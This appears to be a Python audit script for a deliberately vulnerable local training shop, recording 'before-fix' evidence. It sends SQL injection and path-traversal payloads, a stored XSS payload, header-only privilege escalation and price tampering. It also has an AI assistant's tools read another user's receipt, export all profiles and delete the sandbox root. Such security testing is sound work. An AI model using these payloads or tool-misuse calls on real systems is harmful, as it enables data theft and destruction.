#!/usr/bin/env python3
import json
import os
import re
import signal
import subprocess
import sys
import time
from dataclasses import dataclass
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen


EVIDENCE_DIR = os.path.join(os.path.dirname(__file__), "..", "evidence", "before")
EVIDENCE_DIR = os.path.realpath(EVIDENCE_DIR)


@dataclass
class HttpResult:
    status: int
    headers: dict
    body: str


def ensure_dir(path: str):
    os.makedirs(path, exist_ok=True)


def save_json(path: str, data: dict):
    ensure_dir(os.path.dirname(path))
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def http_call(base: str, method: str, path: str, body=None, headers=None) -> HttpResult:
    headers = {"Content-Type": "application/json", **(headers or {})}
    data = None
    if body is not None:
        data = json.dumps(body).encode("utf-8") if not isinstance(body, (bytes, bytearray)) else body
    req = Request(base + path, data=data, headers=headers, method=method)
    try:
        resp = urlopen(req, timeout=5)
    except HTTPError as exc:
        resp = exc
    except URLError as exc:
        raise RuntimeError(f"HTTP failed: {exc}")
    with resp:
        raw = resp.read()
        try:
            text = raw.decode("utf-8")
        except Exception:
            text = ""
        return HttpResult(resp.status, dict(resp.headers.items()), text)


def start_server(port: int = 8066):
    proc = subprocess.Popen([
        sys.executable, os.path.join(os.path.dirname(__file__), "service.py"), "--port", str(port)
    ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    base_url = None
    sandbox_root = None
    # Read first few lines synchronously
    start = time.time()
    while time.time() - start < 5:
        line = proc.stdout.readline()
        if not line:
            time.sleep(0.05)
            continue
        if line.startswith("Local exercise:"):
            m = re.search(r"(http://127.0.0.1:\d+)", line)
            if m:
                base_url = m.group(1)
        if line.startswith("Disposable fixture files:"):
            sandbox_root = line.split(":", 1)[1].strip()
        if base_url and sandbox_root:
            break
    if not base_url:
        # Port may be busy; ask OS to choose
        proc.kill()
        proc.wait(timeout=2)
        proc = subprocess.Popen([
            sys.executable, os.path.join(os.path.dirname(__file__), "service.py"), "--port", "0"
        ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        start = time.time()
        while time.time() - start < 5:
            line = proc.stdout.readline()
            if not line:
                time.sleep(0.05)
                continue
            if line.startswith("Local exercise:"):
                m = re.search(r"(http://127.0.0.1:\d+)", line)
                if m:
                    base_url = m.group(1)
            if line.startswith("Disposable fixture files:"):
                sandbox_root = line.split(":", 1)[1].strip()
            if base_url and sandbox_root:
                break
    if not base_url:
        raise RuntimeError("Failed to start server")
    return proc, base_url, sandbox_root


def stop_server(proc: subprocess.Popen):
    if proc.poll() is None:
        try:
            proc.send_signal(signal.SIGINT)
            proc.wait(timeout=3)
        except Exception:
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except Exception:
                proc.kill()


def login(base):
    r = http_call(base, "POST", "/login", {"username": "alice", "password": "learn-alice"})
    token = json.loads(r.body)["token"] if r.status == 200 else None
    return token


def login_staff(base):
    r = http_call(base, "POST", "/login", {"username": "staff", "password": "learn-staff"})
    token = json.loads(r.body)["token"] if r.status == 200 else None
    return token


def main():
    ensure_dir(EVIDENCE_DIR)
    base = os.environ.get("SHOP_BASE", "http://127.0.0.1:8066")
    # Ping health; if down — start server
    try:
        hr = http_call(base, "GET", "/health")
        server_started_here = False
        sandbox_root = None
    except Exception:
        proc, base, sandbox_root = start_server(8066)
        server_started_here = True
        save_json(os.path.join(EVIDENCE_DIR, "host.json"), {"base_url": base, "sandbox_root": sandbox_root})

    def save_check(name, req, res: HttpResult, note=None):
        path = os.path.join(EVIDENCE_DIR, f"{name}.json")
        save_json(path, {
            "request": req,
            "response": {"status": res.status, "headers": res.headers, "body": res.body},
            "note": note or ""
        })

    # Prepare: login as alice and staff
    alice_token = login(base)
    staff_token = login_staff(base)

    # T1: SQLi /profile
    res = http_call(base, "GET", "/profile?" + urlencode({"id": "1 OR 1=1"}))
    save_check("T1_profile_sqli", {"method": "GET", "path": "/profile?id=1 OR 1=1"}, res,
               "Expect many rows due to SQLi")

    # T2: SQLi /search
    res = http_call(base, "GET", "/search?" + urlencode({"q": "%' OR 1=1 --"}))
    save_check("T2_search_sqli", {"method": "GET", "path": "/search?q=%' OR 1=1 --"}, res,
               "Expect all profiles due to LIKE injection")

    # T3: Orders without auth
    res = http_call(base, "GET", "/orders")
    save_check("T3_orders_no_auth", {"method": "GET", "path": "/orders"}, res,
               "Orders visible without authentication")

    # T4: Client-controlled price
    res = http_call(base, "POST", "/orders", {"product": "chair", "price": 1}, {"X-Token": alice_token})
    save_check("T4_custom_price", {"method": "POST", "path": "/orders", "body": {"product": "chair", "price": 1}}, res,
               "Expect price=1 accepted")

    # T5: X-Role staff escalation (no token)
    res = http_call(base, "GET", "/admin/export", headers={"X-Role": "staff"})
    save_check("T5_admin_export_header_only", {"method": "GET", "path": "/admin/export", "headers": {"X-Role": "staff"}}, res,
               "Expect success without real staff session")

    # T6: IDOR files (read Bob receipt as Alice)
    res = http_call(base, "GET", "/files?" + urlencode({"user": "bob", "path": "receipt.txt"}), headers={"X-Token": alice_token})
    save_check("T6_files_idor_bob_receipt", {"method": "GET", "path": "/files?user=bob&path=receipt.txt"}, res,
               "Expect Bob receipt visible to Alice")
    # Attempt private note via traversal
    res = http_call(base, "GET", "/files?" + urlencode({"user": "..", "path": "../private/operator-note.txt"}), headers={"X-Token": alice_token})
    save_check("T6_files_idor_private_note", {"method": "GET", "path": "/files?user=..&path=../private/operator-note.txt"}, res,
               "Expect private note readable inside sandbox")

    # T7: Debug logs exposed
    res = http_call(base, "GET", "/debug/logs")
    save_check("T7_debug_logs_exposed", {"method": "GET", "path": "/debug/logs"}, res,
               "Expect logs available without auth, possibly containing tokens/bodies")

    # T8: Stored XSS in reviews
    payload = "<img src=x onerror=alert(1)>"
    _ = http_call(base, "POST", "/reviews", {"product": "chair", "text": payload}, {"X-Token": alice_token})
    res = http_call(base, "GET", "/reviews/view", headers={"X-Token": alice_token})
    save_check("T8_reviews_stored_xss", {"method": "POST+GET", "paths": ["/reviews", "/reviews/view"], "payload": payload}, res,
               "Expect raw HTML echoed and Content-Type text/html")

    # T9a: Tool misuse read_file to Bob receipt
    decision = {"decision": {"tool": "read_file", "arguments": {"path": "files/bob/receipt.txt"}}}
    res = http_call(base, "POST", "/assistant/execute", decision, {"X-Token": alice_token})
    save_check("T9a_tool_read_bob_receipt", {"method": "POST", "path": "/assistant/execute", "body": decision}, res,
               "Expect assistant to read Bob receipt")
    # T9b: Tool misuse export_profiles
    decision = {"decision": {"tool": "export_profiles", "arguments": {}}}
    res = http_call(base, "POST", "/assistant/execute", decision, {"X-Token": alice_token})
    save_check("T9b_tool_export_profiles", {"method": "POST", "path": "/assistant/execute", "body": decision}, res,
               "Expect export of profiles without staff check")

    # T10: Error details (invalid JSON)
    # Send invalid JSON body
    bad_body = b"{not: json}"
    res = http_call(base, "POST", "/login", bad_body, {})
    save_check("T10_error_invalid_json", {"method": "POST", "path": "/login", "body": "{not: json}"}, res,
               "Expect 500 with JSONDecodeError")

    # Additional: access foreign profile without SQLi
    res = http_call(base, "GET", "/profile?" + urlencode({"id": "2"}), headers={"X-Token": alice_token})
    save_check("A1_profile_foreign_without_sqli", {"method": "GET", "path": "/profile?id=2"}, res,
               "Expect Bob profile accessible (no auth)")

    # Additional: assistant/context foreign order and SQLi
    res = http_call(base, "GET", "/assistant/context?" + urlencode({"order_id": "2"}), headers={"X-Token": alice_token})
    save_check("A2_assistant_context_foreign_order", {"method": "GET", "path": "/assistant/context?order_id=2"}, res,
               "Expect context to include Bob order")
    res = http_call(base, "GET", "/assistant/context?" + urlencode({"order_id": "1 OR 1=1"}), headers={"X-Token": alice_token})
    save_check("A3_assistant_context_order_sqli", {"method": "GET", "path": "/assistant/context?order_id=1 OR 1=1"}, res,
               "Expect multiple orders in context due to SQLi")

    # Additional: wrong types (non-json Content-Type handled as JSON already); invalid product type
    res = http_call(base, "POST", "/orders", {"product": 123, "price": "abc"}, {"X-Token": alice_token})
    save_check("A4_orders_wrong_types", {"method": "POST", "path": "/orders", "body": {"product": 123, "price": "abc"}}, res,
               "Expect 400 unknown product or error")

    # Sensitive routes without auth: admin/export also with no headers should be 403
    res = http_call(base, "GET", "/admin/export")
    save_check("A5_admin_export_no_header", {"method": "GET", "path": "/admin/export"}, res,
               "Expect 403 without header; prior check shows header-only grants access")

    # Separate instance for delete_tree
    proc2, base2, sandbox2 = start_server(0)
    save_json(os.path.join(EVIDENCE_DIR, "host_delete_tree.json"), {"base_url": base2, "sandbox_root": sandbox2})
    decision = {"decision": {"tool": "delete_tree", "arguments": {"path": "."}}}
    res = http_call(base2, "POST", "/assistant/execute", decision)
    save_check("T9c_tool_delete_tree", {"method": "POST", "path": "/assistant/execute", "body": decision, "target": base2}, res,
               "Expect deletion of sandbox root on separate instance")
    # Verify deletion effect by attempting to read a known file
    res2 = http_call(base2, "GET", "/files?" + urlencode({"user": "alice", "path": "receipt.txt"}))
    save_check("T9c_tool_delete_tree_followup", {"method": "GET", "path": "/files?user=alice&path=receipt.txt", "target": base2}, res2,
               "Expect FileNotFoundError in response after deletion")
    stop_server(proc2)

    # Shutdown server if we started it here
    if 'server_started_here' in locals() and server_started_here:
        stop_server(proc)


if __name__ == "__main__":
    main()
